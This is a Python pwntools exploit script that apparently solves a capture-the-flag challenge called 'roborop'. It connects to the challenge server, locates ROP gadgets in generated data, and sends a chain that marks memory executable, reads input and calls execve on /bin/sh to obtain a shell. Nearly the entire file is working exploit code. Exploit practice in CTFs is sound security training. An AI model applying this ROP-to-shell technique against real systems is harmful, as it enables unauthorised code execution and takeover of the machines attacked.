#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = ELF(elf.libc)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
brva 0x1582
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'roborop-1.play.hfsc.tf'
    port = int(args.PORT or 1993)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


ru(b'seed: ')
seed = int(rl().decode(), 16)

ru(b'addr: ')
addr = int(rl().decode(), 16)

info(f'seed {seed:#x}')
info(f'addr {addr:#x}')

info(f"Generating data {seed}")
import os
os.system(f"./seed {seed}")

info("finding rop")
os.system(f'ropr ./seed_data --raw=true -m=2 | grep "ret;" > gadgets')

gadgets = open("./gadgets", "rt").read().strip().splitlines()

def find_gadget(g):
    import re
    f = next(filter(lambda line: g in line, gadgets))
    a = f.split(':')[0]
    return int(a, 16) + addr


pop_rdi = find_gadget('pop rdi; ret;')
pop_rsi = find_gadget('pop rsi; ret;')
pop_rdx = find_gadget('pop rdx; ret;')
pop_rax = find_gadget('pop rax; ret;')
syscall = find_gadget('syscall; ret;')

# controlling rsp
sa(b'rops: ', flat(
    pop_rax, 10,
    pop_rdi, addr,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    syscall,
    
    pop_rdi, constants.STDIN_FILENO,
    pop_rsi, addr,
    pop_rdx, 0x100,
    syscall,
    
    pop_rax, 59,
    pop_rdi, addr,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall
))

info("enter to shell")
pause()

s(b'/bin/sh' + p8(0)*0x40)



ia()
